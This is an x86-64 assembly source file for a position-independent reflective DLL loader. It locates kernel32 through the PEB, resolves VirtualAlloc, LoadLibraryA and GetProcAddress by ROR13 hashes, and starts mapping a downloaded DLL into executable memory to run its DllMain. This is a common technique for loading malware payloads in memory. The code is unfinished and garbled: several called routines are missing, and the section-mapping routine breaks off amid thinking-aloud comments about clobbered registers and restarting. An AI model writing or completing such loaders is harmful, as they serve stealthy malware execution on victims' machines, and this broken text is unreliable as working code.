.intel_syntax noprefix
.section .text

# ═══════════════════════════════════════════════════════════════════════════════
#  reflective_loader.asm — PIC Reflective DLL Loader (modular)
#  ────────────────────────────────────────────────────────────────────────────
#  1. PEB → kernel32
#  2. Resolve VirtualAlloc, LoadLibraryA, GetProcAddress
#  3. Map DLL sections
#  4. Resolve IAT
#  5. Apply relocations
#  6. Call DllMain
# ═══════════════════════════════════════════════════════════════════════════════

.globl _reflective_loader_start
.globl _dll_offset_marker

# ═══════════════════════════════════════════════════════════════════════════════
#  Builder marker (8 magic + 8 QWORD offset to DLL)
# ═══════════════════════════════════════════════════════════════════════════════
.align 8
_dll_offset_marker:
    .byte 0xAA, 0xBB, 0xCC, 0xDD
    .quad 0

# ═══════════════════════════════════════════════════════════════════════════════
#  Register convention across all functions:
#    R15 = loader entry (PIC base, fixed)
#    R14 = DLL file data in download buffer
#    R12 = mapped DLL base (VirtualAlloc'd)
#    RBX = pVirtualAlloc
#    RDI = pLoadLibraryA
#    RSI = pGetProcAddress
#    R13 = Scratch
# ═══════════════════════════════════════════════════════════════════════════════

_reflective_loader_start:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15
    sub     rsp, 0x40                # local storage

    # ── PIC base ──
    lea     r15, [rip + _reflective_loader_start]

    # ── DLL address ──
    lea     rax, [rip + _dll_offset_marker]
    mov     r14, [rax + 4]
    add     r14, r15

    # ── Validate MZ ──
    cmp     word ptr [r14], 0x5A4D
    jne     .Lerror

    # ── PEB → kernel32 ──
    mov     rax, gs:[0x60]
    mov     rax, [rax + 0x18]
    mov     rsi, [rax + 0x10]        # Flink (EXE)
    mov     rsi, [rsi]               # -> ntdll
    mov     rsi, [rsi]               # -> kernel32
    mov     r12, [rsi + 0x20]        # kernel32 base

    # ── Resolve host APIs ──
    mov     rcx, r12
    mov     edx, 0x302EBE1C          # ROR13("VirtualAlloc")
    call    .Lapi_resolve
    mov     rbx, rax
    test    rax, rax
    jz      .Lerror

    mov     rcx, r12
    mov     edx, 0x8A8B4676          # ROR13("LoadLibraryA")
    call    .Lapi_resolve
    mov     rdi, rax
    test    rax, rax
    jz      .Lerror

    mov     rcx, r12
    mov     edx, 0x1ACAEE7A          # ROR13("GetProcAddress")
    call    .Lapi_resolve
    mov     rsi, rax
    test    rax, rax
    jz      .Lerror

    # ── Save APIs to stack frame ──
    mov     [rbp - 0x08], rbx        # pVirtualAlloc
    mov     [rbp - 0x10], rdi        # pLoadLibraryA
    mov     [rbp - 0x18], rsi        # pGetProcAddress

    # ── Phase 1: Map sections ──
    mov     rcx, r14                 # DLL file data
    call    .Lphase_map_sections
    mov     r12, rax                 # mapped base
    test    rax, rax
    jz      .Lerror

    # ── Phase 2: Resolve imports ──
    mov     rcx, r14                 # DLL file data
    mov     rdx, r12                 # mapped base
    mov     r8,  [rbp - 0x10]        # pLoadLibraryA
    mov     r9,  [rbp - 0x18]        # pGetProcAddress
    call    .Lphase_resolve_imports

    # ── Phase 3: Apply relocations ──
    mov     rcx, r14                 # DLL file data
    mov     rdx, r12                 # mapped base
    call    .Lphase_apply_relocs

    # ── Phase 4: Call DllMain ──
    mov     rcx, r14                 # DLL file data
    mov     rdx, r12                 # mapped base
    call    .Lphase_call_dllmain

    xor     eax, eax
    jmp     .Ldone

.Lerror:
    mov     eax, 1
.Ldone:
    lea     rsp, [rbp - 8*8 - 0x40]
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    pop     rbp
    ret

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 1: map_sections(dll_file_base) → mapped_base
#  ────────────────────────────────────────────────────────────────────────────
#  Allocates memory, copies sections from file-formatted DLL to in-memory layout.
#  Input:  RCX = DLL file data base
#  Output: RAX = mapped DLL base, or 0 on failure
#  Uses:   R12 for mapped base, R15 for APIs
# ═══════════════════════════════════════════════════════════════════════════════

.Lphase_map_sections:
    push    rbp
    mov     rbp, rsp
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14

    mov     r14, rcx                 # R14 = DLL file data

    # ── Parse PE header ──
    mov     eax, [r14 + 0x3C]        # e_lfanew
    lea     r13, [r14 + rax]         # R13 = PE header

    cmp     dword ptr [r13], 0x4550
    jne     .Lmap_fail
    cmp     word ptr [r13 + 0x18], 0x020B
    jne     .Lmap_fail

    # ── Read headers ──
    mov     ecx, [r13 + 0x50]        # SizeOfImage (OH+0x38 = PE+0x50)
    mov     r8,  [r13 + 0x30]        # ImageBase (OH+0x18 = PE+0x30)
    mov     r9d, [r13 + 0x28]        # EntryPointRVA (OH+0x10 = PE+0x28)

    mov     [rbp - 0x10], ecx        # Save SizeOfImage
    mov     [rbp - 0x18], r8         # Save ImageBase
    mov     [rbp - 0x20], r9d        # Save EntryPointRVA

    # ── Try VirtualAlloc at preferred base ──
    mov     rcx, r8                  # lpAddress = ImageBase
    mov     edx, ecx                 # Wait, ecx was SizeOfImage but I stored it
    # Reload
    mov     rdx, [rbp - 0x10]        # dwSize = SizeOfImage
    mov     r8d, 0x3000              # MEM_COMMIT|MEM_RESERVE
    mov     r9d, 0x40                # PAGE_EXECUTE_READWRITE
    mov     rax, [rbp - 0x08]        # pVirtualAlloc... wait, this was from the caller's frame!
    # Need to pass pVA differently. Save it in a non-volatile register.

    # Hmm, let me simplify. I'll use the stack to pass things.
    # Actually, let me just use R15 for pVA (saved from the caller).
    # But the caller uses R15 for loader base!
    
    # OK, let me restructure. The main function will call phases with
    # everything they need passed as arguments or stored in known stack locations.

    # This is getting complex. Let me restart with a cleaner calling convention.

.Lmap_fail:
    xor     eax, eax

.Lmap_done:
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    pop     rbp
    ret
